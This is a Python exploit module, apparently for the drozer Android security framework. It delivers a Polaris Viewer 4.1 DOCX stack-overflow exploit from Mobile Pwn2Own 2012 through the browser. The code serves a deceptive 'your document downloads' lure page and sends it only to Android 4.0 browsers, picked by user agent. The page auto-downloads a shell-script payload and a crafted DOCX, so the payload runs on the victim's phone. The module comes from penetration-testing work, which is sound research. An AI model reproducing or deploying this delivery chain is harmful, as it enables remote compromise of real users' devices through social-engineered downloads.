from drozer.modules import Module, common
import os

class PolarisViewerBoF_BrowserDelivery(Module, common.Exploit):

    name = "Deliver Polaris Viewer 4 exploit files over browser (Mobile Pwn2Own 2012)"
    description = """
    When parsing DOCX files containing VML shapes, for example Word Art, the application makes a call to CDocxShape::readDrawShapeInfo. This function parses a series of tags associated with a VML shape. When it encounters an "adj" tag, the function enters a loop that parses the tag value as a list of comma-separated values. Each of these values are copied into a 64-byte buffer on the stack without checking their length. If any of these values exceed 64 bytes in size, it is possible to corrupt stack memory and gain control of the program's flow of execution.
    This was turned into a browser-based attack because the exploit relies on an additional file containing the shell commands to run e.g. install a package or echo out a binary and run it. This was originally sent over NFC as demonstrated at Mobile Pwn2Own 2012.
    
    References: http://labs.mwrinfosecurity.com/blog/2012/09/19/mobile-pwn2own-at-eusecwest-2012/
    Vulnerable: 

      * Polaris Viewer 4.1

    NOTE: Currently only works on ICS devices with a T-Mobile linker (MD5SUM=ca89ef3ffa6f48ca4147387638559d94)
    """
    examples = ""
    author = ["Tyrone (@mwrlabs)", "Jon (@mwrlabs)", "Jacques (@mwrlabs)", "Nils (@mwrlabs)"]
    date = "2013-07-17"
    license = "BSD (3 clause)"
    path = ["exploit", "remote", "fileformat"]
    module_type = "exploit"
    payloads = ["weasel.shell.armeabi"]
    
    __template = """
    <html>
        <head>
            <script>
                
                function file2()
                {
                    window.location = "download.docx";
                }

                function file1()
                {
                    window.location = "auth.bin";
                    setTimeout(file2, 7000);   
                }

            </script>
        </head>
        <body bgcolor="black" onload="file1();">
            <center>
                <div style="color:white">Please be patient while your document downloads...</div><br />
                <img src="data:image/png;base64,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" />
            </center>
        </body>
    </html>
    """
    
    def __init__(self, session, loader):
        Module.__init__(self, session)
        common.Exploit.__init__(self, loader)

        self.payload_format = "R"   # Only available option for this payload
        self.working_directory = "/data/data/com.infraware.polarisviewer4"

    def add_arguments(self, parser):
        parser.add_argument("--resource", default=None, help="specify the path component of the resultant exploit URI")
    
    def generate(self, arguments):

        print "Uploading blank page to /...",
        if not self.upload(arguments, "/", " "):
            return

        print "Uploading shell script to auth.bin...",
        if not self.upload(arguments, "/auth.bin", "#!/system/bin/sh\n" + self.payload, mimetype="application/octet-stream"):
            return
        
        f = open(os.path.join(os.path.dirname(__file__) , "ca89ef3ffa6f48ca4147387638559d94.docx"), "r")
        print "Uploading document to /download.docx...",
        if not self.upload(arguments, "/download.docx", f.read(), mimetype="application/vnd.openxmlformats-officedocument.wordprocessingml.document"):
            f.close()
            return
        f.close()

        path = self.generate_or_default_path(arguments.resource)
        print "Uploading web delivery page to %s..." % path,
        if not self.upload(arguments, path, self.build_multipart({ ".*Android.*4\.0.*": self.__template }, "gc0p4Jq0M2Yt08jU534c0p"), headers={ "X-Drozer-Vary-UA": "true; boundary=gc0p4Jq0M2Yt08jU534c0p" }):
            return
        
        print "Done. Exploit delivery page is available on: http://%s:%d%s" % (arguments.server[0], arguments.server[1], path.replace("\\",""))
